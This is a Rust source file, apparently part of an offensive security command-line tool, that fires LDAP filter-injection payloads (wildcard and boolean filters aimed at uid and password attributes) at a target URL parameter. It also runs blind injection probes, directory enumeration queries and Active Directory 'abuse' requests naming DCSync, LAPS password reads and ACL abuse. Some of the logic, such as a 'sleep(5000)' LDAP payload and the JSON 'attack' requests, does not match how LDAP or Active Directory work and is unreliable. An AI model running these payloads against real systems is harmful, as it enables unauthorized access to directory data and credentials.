use colored::Colorize;
use reqwest::Client;
use std::time::Duration;

fn build_client(timeout: u64) -> Client {
    Client::builder().timeout(Duration::from_secs(timeout)).redirect(reqwest::redirect::Policy::none()).build().unwrap_or_else(|_| Client::new())
}

pub async fn filter(url: &str, param: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} LDAP Filter Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let payloads = [
        ("Close + wildcard", "*)(uid=*)"),
        ("Close + admin", "*)(uid=admin))"),
        ("Boolean AND", "*)(uid=*)(|(password=*))"),
        ("Boolean OR", "admin)(|(password=*))"),
        ("UID wildcard", "*)(uid=*)"),
        ("CN injection", "admin)(cn=*)"),
        ("MemberOf", "admin)(memberOf=CN=Admins"),
        ("ObjectClass", "*)(objectClass=*)"),
    ];

    let baseline = send(&client, url, param, "test", token).await?;

    for (name, payload) in &payloads {
        let resp = send(&client, url, param, payload, token).await?;
        let size_diff = (resp.1 as i64 - baseline.1 as i64).abs();
        let has_error = resp.2.contains("LDAP") || resp.2.contains("ldap") || resp.2.contains("filter") || resp.2.contains("naming");
        let tag = if has_error { "ERROR LEAK".red().bold().to_string() }
            else if size_diff > 100 { format!("SIZE DIFF {:+}", size_diff).yellow().to_string() }
            else { "no change".to_string() };
        println!("  {} {:25} status={} {}", "*".cyan(), name, resp.0, tag);
    }

    println!("\n{} Look for LDAP error messages or response size changes.", "[*]".cyan().bold());
    Ok(())
}

pub async fn blind(url: &str, param: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Blind LDAP Injection", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} URL: {} param: {}", "[*]".cyan().bold(), url, param);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);

    let true_resp = send(&client, url, param, "admin)(uid=admin", token).await?;
    let false_resp = send(&client, url, param, "admin)(uid=__nonexistent__", token).await?;

    let size_diff = (true_resp.1 as i64 - false_resp.1 as i64).abs();
    println!("  {} True condition:  {} bytes, status={}", "*".cyan(), true_resp.1, true_resp.0);
    println!("  {} False condition: {} bytes, status={}", "*".cyan(), false_resp.1, false_resp.0);
    println!("  {} Size difference: {} bytes", "*".cyan(), size_diff);

    if size_diff > 50 {
        println!("\n{} Boolean-based blind LDAP injection likely!", "[!]".red().bold());
    } else {
        println!("\n{} No significant boolean difference — testing time-based...", "[*]".cyan().bold());
        let time_payload = "admin)(uid=admin)(sleep(5000))";
        let start = std::time::Instant::now();
        let _ = send(&client, url, param, time_payload, token).await;
        let elapsed = start.elapsed();
        if elapsed.as_millis() > 4500 {
            println!("  {} Time-based: {}ms — VULNERABLE!", "[!]".red().bold(), elapsed.as_millis());
        } else {
            println!("  {} Time-based: {}ms — not vulnerable", "*".green(), elapsed.as_millis());
        }
    }
    Ok(())
}

pub async fn enum_ldap(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} LDAP Enumeration", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let queries = [
        ("All users", "(objectClass=user)"),
        ("All groups", "(objectClass=group)"),
        ("All computers", "(objectClass=computer)"),
        ("Domain admins", "(memberOf=CN=Domain Admins,CN=Users)"),
        ("Service accounts", "(servicePrincipalName=*)"),
        ("Trusts", "(objectClass=trustedDomain)"),
        ("Sites", "(objectClass=site)"),
        ("Subnets", "(objectClass=subnet)"),
    ];

    for (name, query) in &queries {
        let body = serde_json::json!({"action": "ldap_search", "filter": query});
        let mut req = client.post(url).json(&body);
        if let Some(t) = token { req = req.header("Authorization", format!("Bearer {}", t)); }
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let count = text.matches("dn:").count() + text.matches("\"dn\"").count();
                let tag = if count > 0 { format!("{} entries", count).green().to_string() } else { format!("status={}", status) };
                println!("  {} {:25} {}", "*".cyan(), name, tag);
            }
            Err(_) => { println!("  {} {:25} error", "*".red(), name); }
        }
    }
    Ok(())
}

pub async fn ad(url: &str, token: Option<&str>, timeout: u64) -> anyhow::Result<()> {
    println!("{} Active Directory LDAP Abuse", "[*]".cyan().bold());
    println!("{}", "=".repeat(60).cyan());
    println!("{} Target: {}", "[*]".cyan().bold(), url);
    println!("{}", "-".repeat(60).dimmed());

    let client = build_client(timeout);
    let attacks = [
        ("DCSync check", serde_json::json!({"action": "ad", "attack": "dcsync", "dc": "DC01.target.com"})),
        ("AS-REP info", serde_json::json!({"action": "ad", "attack": "asrep_info"})),
        ("SPN enumeration", serde_json::json!({"action": "ad", "attack": "spn_enum"})),
        ("GPO enumeration", serde_json::json!({"action": "ad", "attack": "gpo_enum"})),
        ("ACL abuse", serde_json::json!({"action": "ad", "attack": "acl_abuse", "target": "DC01$"})),
        ("LAPS password read", serde_json::json!({"action": "ad", "attack": "laps_read"})),
        ("Constrained delegation", serde_json::json!({"action": "ad", "attack": "delegation_enum"})),
        ("Unconstrained delegation", serde_json::json!({"action": "ad", "attack": "unconstrained_delegation"})),
    ];

    for (name, body) in &attacks {
        let mut req = client.post(url).json(&body);
        if let Some(t) = token { req = req.header("Authorization", format!("Bearer {}", t)); }
        match req.send().await {
            Ok(resp) => {
                let status = resp.status().as_u16();
                let text = resp.text().await.unwrap_or_default();
                let has_data = text.contains("dn:") || text.contains("\"dn\"") || text.contains("result") || text.contains("success");
                let tag = if has_data { "DATA EXTRACTED".red().bold().to_string() } else { format!("status={}", status) };
                println!("  {} {:30} {}", "*".cyan(), name, tag);
            }
            Err(_) => { println!("  {} {:30} error", "*".red(), name); }
        }
    }
    Ok(())
}

async fn send(client: &Client, url: &str, param: &str, value: &str, token: Option<&str>) -> anyhow::Result<(u16, usize, String)> {
    let target = if url.contains('?') { format!("{}&{}={}", url, param, url_encode(value)) } else { format!("{}?{}={}", url, param, url_encode(value)) };
    let mut req = client.get(&target);
    if let Some(t) = token { req = req.header("Authorization", format!("Bearer {}", t)); }
    let resp = req.send().await?;
    let status = resp.status().as_u16();
    let body = resp.text().await.unwrap_or_default();
    Ok((status, body.len(), body))
}

fn url_encode(s: &str) -> String {
    let mut result = String::new();
    for c in s.chars() {
        if c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.' || c == '~' {
            result.push(c);
        } else {
            for b in c.to_string().bytes() { result.push_str(&format!("%{:02X}", b)); }
        }
    }
    result
}
